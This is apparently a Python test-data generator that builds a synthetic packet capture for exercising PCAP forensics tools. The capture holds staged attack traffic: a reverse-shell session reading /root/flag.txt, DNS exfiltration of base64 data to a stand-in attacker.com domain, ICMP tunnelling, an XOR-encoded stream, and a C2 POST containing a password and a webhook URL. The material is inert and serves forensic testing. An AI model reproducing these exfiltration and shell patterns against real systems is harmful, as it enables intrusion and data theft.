"""
Synthetic PCAP Generator for Testing PCAP Forensics Suite (pcaptree, pcapfile, pcapscan)
Generates realistic multi-protocol network captures with:
- HTTP transfers of WASM and PDF files
- Reverse shell netcat interactive commands
- DNS subdomain exfiltration
- ICMP covert channel ping tunneling
- Base64, XOR, and sensitive crypto tokens
"""
import struct
import time
import socket
import os

def create_pcap(filename: str):
    f = open(filename, "wb")

    # Global PCAP Header (24 bytes)
    # Magic: 0xa1b2c3d4 (microsecond LE), v2.4, thiszone=0, sigfigs=0, snaplen=65535, linktype=1 (Ethernet)
    f.write(struct.pack("<IHHiIII", 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1))

    base_time = 1723680000.0 # 2024-08-15 00:00:00 UTC

    def write_packet(raw_eth_pkt, t_offset):
        ts = base_time + t_offset
        ts_sec = int(ts)
        ts_usec = int((ts - ts_sec) * 1_000_000)
        p_len = len(raw_eth_pkt)
        f.write(struct.pack("<IIII", ts_sec, ts_usec, p_len, p_len))
        f.write(raw_eth_pkt)

    def build_ipv4_tcp_pkt(src_ip, src_port, dst_ip, dst_port, seq, ack, flags, payload):
        # Ethernet Header (14 bytes)
        eth = b"\x00\x0c\x29\x11\x22\x33" + b"\x00\x50\x56\xaa\xbb\xcc" + b"\x08\x00"
        
        # TCP Header (20 bytes)
        tcp_hdr = struct.pack("!HHIIH", src_port, dst_port, seq, ack, (5 << 12) | flags) + struct.pack("!HHH", 8192, 0, 0)
        
        # IP Header (20 bytes)
        ip_total_len = 20 + 20 + len(payload)
        ip_hdr = struct.pack("!BBHHHBBH", 0x45, 0, ip_total_len, 0x1234, 0x4000, 64, 6, 0)
        ip_hdr += socket.inet_aton(src_ip) + socket.inet_aton(dst_ip)
        
        return eth + ip_hdr + tcp_hdr + payload

    def build_ipv4_udp_pkt(src_ip, src_port, dst_ip, dst_port, payload):
        eth = b"\x00\x0c\x29\x11\x22\x33" + b"\x00\x50\x56\xaa\xbb\xcc" + b"\x08\x00"
        udp_len = 8 + len(payload)
        udp_hdr = struct.pack("!HHHH", src_port, dst_port, udp_len, 0)
        ip_total = 20 + udp_len
        ip_hdr = struct.pack("!BBHHHBBH", 0x45, 0, ip_total, 0x5678, 0, 64, 17, 0)
        ip_hdr += socket.inet_aton(src_ip) + socket.inet_aton(dst_ip)
        return eth + ip_hdr + udp_hdr + payload

    def build_ipv4_icmp_pkt(src_ip, dst_ip, icmp_type, icmp_code, payload):
        eth = b"\x00\x0c\x29\x11\x22\x33" + b"\x00\x50\x56\xaa\xbb\xcc" + b"\x08\x00"
        icmp_hdr = struct.pack("!BBHHH", icmp_type, icmp_code, 0, 0x1122, 1)
        ip_total = 20 + 8 + len(payload)
        ip_hdr = struct.pack("!BBHHHBBH", 0x45, 0, ip_total, 0x9abc, 0, 64, 1, 0)
        ip_hdr += socket.inet_aton(src_ip) + socket.inet_aton(dst_ip)
        return eth + ip_hdr + icmp_hdr + payload

    # =========================================================================
    # Stream 1: HTTP Download of WebAssembly module (payload.wasm)
    # =========================================================================
    wasm_bytes = b"\x00asm\x01\x00\x00\x00\x01\x08\x01\x60\x01\x7f\x01\x7f\x03\x02\x01\x00\n\x09\x01\x07\x00\x20\x00\x41\x01\x6a\x0b"
    wasm_bytes += b"\n; Flag inside WebAssembly: flag{wasm_binary_module_carved_2026}\n"
    
    http_req_1 = b"GET /assets/crypto_module.wasm HTTP/1.1\r\nHost: target-server.local\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\nAccept: */*\r\n\r\n"
    http_resp_1 = b"HTTP/1.1 200 OK\r\nServer: nginx/1.18.0\r\nContent-Type: application/wasm\r\nContent-Disposition: attachment; filename=\"crypto_module.wasm\"\r\nContent-Length: " + str(len(wasm_bytes)).encode() + b"\r\n\r\n" + wasm_bytes

    write_packet(build_ipv4_tcp_pkt("192.168.1.105", 49152, "10.0.0.50", 80, 1000, 1, 0x18, http_req_1), 0.1)
    write_packet(build_ipv4_tcp_pkt("10.0.0.50", 80, "192.168.1.105", 49152, 1, 1000 + len(http_req_1), 0x18, http_resp_1), 0.2)

    # =========================================================================
    # Stream 2: HTTP Download of PDF Document
    # =========================================================================
    pdf_bytes = b"%PDF-1.4\n1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n% Secret PDF Document\n% Flag: {PDF_secret_flag_inside_document}\n%%EOF\n"
    http_req_2 = b"GET /documents/confidential_report.pdf HTTP/1.1\r\nHost: intranet.corp\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
    http_resp_2 = b"HTTP/1.1 200 OK\r\nContent-Type: application/pdf\r\nContent-Disposition: attachment; filename=\"confidential_report.pdf\"\r\n\r\n" + pdf_bytes

    write_packet(build_ipv4_tcp_pkt("192.168.1.105", 49153, "10.0.0.50", 80, 2000, 1, 0x18, http_req_2), 0.5)
    write_packet(build_ipv4_tcp_pkt("10.0.0.50", 80, "192.168.1.105", 49153, 1, 2000 + len(http_req_2), 0x18, http_resp_2), 0.6)

    # =========================================================================
    # Stream 3: Reverse Shell Session (Port 4444)
    # =========================================================================
    rev_c2s_1 = b"whoami\n"
    rev_s2c_1 = b"root\n# "
    rev_c2s_2 = b"id; uname -a\n"
    rev_s2c_2 = b"uid=0(root) gid=0(root) groups=0(root)\nLinux pwn-box 5.15.0-generic #1 SMP x86_64\n# "
    rev_c2s_3 = b"cat /root/flag.txt\n"
    rev_s2c_3 = b"flag{reverse_shell_netcat_pwned_2026}\n# "

    write_packet(build_ipv4_tcp_pkt("192.168.1.105", 4444, "10.0.0.99", 55555, 3000, 1, 0x18, rev_s2c_1), 1.0)
    write_packet(build_ipv4_tcp_pkt("10.0.0.99", 55555, "192.168.1.105", 4444, 1, 3000 + len(rev_s2c_1), 0x18, rev_c2s_1), 1.1)
    write_packet(build_ipv4_tcp_pkt("192.168.1.105", 4444, "10.0.0.99", 55555, 3000 + len(rev_s2c_1), 1 + len(rev_c2s_1), 0x18, rev_s2c_2), 1.2)
    write_packet(build_ipv4_tcp_pkt("10.0.0.99", 55555, "192.168.1.105", 4444, 1 + len(rev_c2s_1), 3000 + len(rev_s2c_1) + len(rev_s2c_2), 0x18, rev_c2s_2), 1.3)
    write_packet(build_ipv4_tcp_pkt("192.168.1.105", 4444, "10.0.0.99", 55555, 3000 + len(rev_s2c_1) + len(rev_s2c_2), 1 + len(rev_c2s_1) + len(rev_c2s_2), 0x18, rev_s2c_3), 1.4)
    write_packet(build_ipv4_tcp_pkt("10.0.0.99", 55555, "192.168.1.105", 4444, 1 + len(rev_c2s_1) + len(rev_c2s_2), 3000 + len(rev_s2c_1) + len(rev_s2c_2) + len(rev_s2c_3), 0x18, rev_c2s_3), 1.5)

    # =========================================================================
    # Stream 4: DNS Subdomain Data Exfiltration (UDP Port 53)
    # =========================================================================
    # Query: ZmxhZ3tkbnNfZXhmaWx0cmF0aW9uXzEyMzR9.exfil.attacker.com (base64 of flag{dns_exfiltration_1234})
    def build_dns_query(tx_id, qname):
        hdr = struct.pack("!HHHHHH", tx_id, 0x0100, 1, 0, 0, 0)
        q_bytes = bytearray()
        for part in qname.split("."):
            q_bytes.append(len(part))
            q_bytes.extend(part.encode("latin-1"))
        q_bytes.append(0) # Null terminator
        q_bytes.extend(struct.pack("!HH", 1, 1)) # Type A, Class IN
        return hdr + bytes(q_bytes)

    dns_payload = build_dns_query(0x1337, "ZmxhZ3tkbnNfZXhmaWx0cmF0aW9uXzEyMzR9.exfil.attacker.com")
    write_packet(build_ipv4_udp_pkt("192.168.1.105", 53535, "8.8.8.8", 53, dns_payload), 2.0)

    # =========================================================================
    # Stream 5: ICMP Echo Covert Tunneling
    # =========================================================================
    icmp_data = b"FLAG_PING_DATA: flag{icmp_ping_tunnel_data_exfil_2026}"
    write_packet(build_ipv4_icmp_pkt("192.168.1.105", "10.0.0.99", 8, 0, icmp_data), 2.5)

    # =========================================================================
    # Stream 6: Obfuscated XOR Payload Stream (XOR Key 0x37)
    # =========================================================================
    xor_flag = bytes([c ^ 0x37 for c in b"flag{xor_encrypted_pcap_stream_999}"])
    xor_stream = b"--- XOR ENCRYPTED CHANNEL ---\n" + xor_flag + b"\n--- END ---"
    write_packet(build_ipv4_tcp_pkt("192.168.1.105", 60001, "10.0.0.77", 9001, 5000, 1, 0x18, xor_stream), 3.0)

    # =========================================================================
    # Stream 7: Cryptographic Parameters & C2 Webhook
    # =========================================================================
    crypto_stream = (
        b"POST /api/v1/sync HTTP/1.1\r\nHost: api.c2server.org\r\n"
        b"Content-Type: application/json\r\n\r\n"
        b"{\"salt\": \"8a9f0b1c2d3e4f5a\", \"iv\": \"1122334455667788\", \"password\": \"SuperSecretAdminP@ss!\", "
        b"\"c2_webhook\": \"https://discord.com/api/webhooks/999111222/supersecrettoken123\"}\n"
    )
    write_packet(build_ipv4_tcp_pkt("192.168.1.105", 60002, "10.0.0.88", 8080, 6000, 1, 0x18, crypto_stream), 3.5)

    f.close()
    print(f"[] Successfully generated synthetic PCAP evidence: {filename} ({os.path.getsize(filename)} bytes)")

if __name__ == "__main__":
    out_path = os.path.join(os.path.dirname(__file__), "evidence.pcap")
    create_pcap(out_path)
